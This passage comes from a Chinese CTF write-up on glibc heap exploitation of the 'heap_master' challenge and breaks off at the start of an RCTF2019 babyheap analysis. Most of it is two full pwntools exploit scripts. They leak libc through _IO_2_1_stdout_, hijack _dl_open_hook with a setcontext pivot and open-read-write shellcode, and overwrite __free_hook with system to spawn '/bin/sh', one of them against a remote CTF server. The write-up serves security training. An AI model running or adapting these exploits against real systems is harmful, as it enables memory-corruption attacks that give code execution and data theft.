class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7a0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set two main_arena addr</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    <span class="comment">#Edit(0x330+0x30,p64(0)+p64(0x411))#2 again</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0x3f0</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x8</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(stdout_addr<span class="number">-0x10</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x18</span>+<span class="number">0x8</span>,p64(<span class="number">0</span>)+p16(stdout_addr+<span class="number">0x19</span><span class="number">-0x20</span>))</span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p.recvn(<span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">        <span class="comment">#map</span></span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0xc13b1800</span><span class="number">-0xc13a9000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x8800</span></span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd5683</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line">    libc.address =  libc_base</span><br><span class="line">    _dl_open_hook = libc_base + (<span class="number">0x7ffff7dd92e0</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    mov_rdi_call_rbx = libc_base + <span class="number">0x7fd7d</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x20</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *setcontext+53')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:000000000007FD7D                 mov     rdi, [rbx+48h]</span></span><br><span class="line"><span class="comment"># .text:000000000007FD81                 mov     rsi, r13</span></span><br><span class="line"><span class="comment"># .text:000000000007FD84                 call    qword ptr [rbx+40h]</span></span><br><span class="line"><span class="comment"># 0x7fae9ce44b75 &lt;setcontext+53&gt;: mov    rsp,QWORD PTR [rdi+0xa0]</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>,p64(mov_rdi_call_rbx))</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>+<span class="number">0x40</span>,p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)+p64(map_addr+<span class="number">0x200</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p_rsp = libc_base + <span class="number">0x0000000000003870</span></span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x68</span>,p64(map_addr))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x70</span>,p64(<span class="number">0x10000</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x88</span>,p64(<span class="number">7</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0xa0</span>,p64(map_addr+offset+<span class="number">0x200</span>)+p64(libc.sym[<span class="string">'mprotect'</span>]))</span><br><span class="line">    <span class="comment">#sc</span></span><br><span class="line">    sc = asm(<span class="string">'mov rdi,'</span>+str(map_addr+offset))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            mov rax,2</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,rax</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    sc += asm(<span class="string">'mov rsi,'</span>+str(map_addr+<span class="number">0x300</span>))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rdx,48</span></span><br><span class="line"><span class="string">            mov rax,0</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,1</span></span><br><span class="line"><span class="string">            mov rax,1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    Edit(offset,<span class="string">'./flag\x00'</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x1f8</span>,<span class="string">'./flag\x00\x00'</span>+p64(map_addr+<span class="number">0x208</span>)+sc)</span><br><span class="line">    <span class="comment">#offset+0x8900</span></span><br><span class="line">    Delete(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h4 id="方法三：-unsorted-bin-free-hook"><a href="#方法三：-unsorted-bin-free-hook" class="headerlink" title="方法三： unsorted bin+free_hook"></a>方法三： unsorted bin+free_hook</h4><p>参考链接：<a href="https://z3r3f.gitee.io/2019/05/12/2019StartCTF/" target="_blank" rel="noopener">https://z3r3f.gitee.io/2019/05/12/2019StartCTF/</a></p><p>前面是unsorted bin的利用，来改global_max_fast和leak地址，和方法一的前部分是一样的</p><p>后面是利用free 指定大小的chunk 填入main_arena fastbinY的队列，覆盖free_hook<br>所以我们找到main_arena到free_hook的偏移来算出chunk的指定size<br>然后改值为system，delete内容为’/bin/sh’的chunk就可以getshell了</p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># p = process('./heap_master')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27915</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('1')</span></span><br><span class="line"><span class="comment"># self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.sendline(str(len(content)))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line"><span class="comment"># if self.wait:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('3')</span></span><br><span class="line"><span class="comment"># self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line">fastbin_ptr=libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x1c88</span> +<span class="number">8</span></span><br><span class="line">free_hook=libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=<span class="number">0x3920</span></span><br><span class="line">fake_size=p64(size+<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0x38</span>,fake_size)</span><br><span class="line">edit(<span class="number">0x30</span>+size,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,p64(system_addr))<span class="comment">#修改fd为system</span></span><br><span class="line">malloc(<span class="number">0x3910</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0x110</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-babyheap"><a href="#RCTF2019-babyheap" class="headerlink" title="RCTF2019 babyheap"></a>RCTF2019 babyheap</h3><p>这道题想解决的知识点：</p><blockquote><p>1.colloc的原理<br>2.house of strom</p></blockquote><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用mallopt关闭了fastbin的分配<br>那就用large bin attack（也可以通过改global_max_fast来实现重新开启fastbin，这种方法会比较麻烦，这里重点讲largebin）</p><p>off by one的洞，开了沙箱，ban掉了execve，就只能orw<br>我们通过overlap来leak出libc的地址，然后构造chunk(size大于空闲块)，空闲块进入smallbin，然后就可以leak出heap的地址</p><h4 id="colloc"><a href="#colloc" class="headerlink" title="colloc"></a>colloc</h4><p>calloc申请堆块会对堆块进行清空</p><blockquote><p>函数calloc() 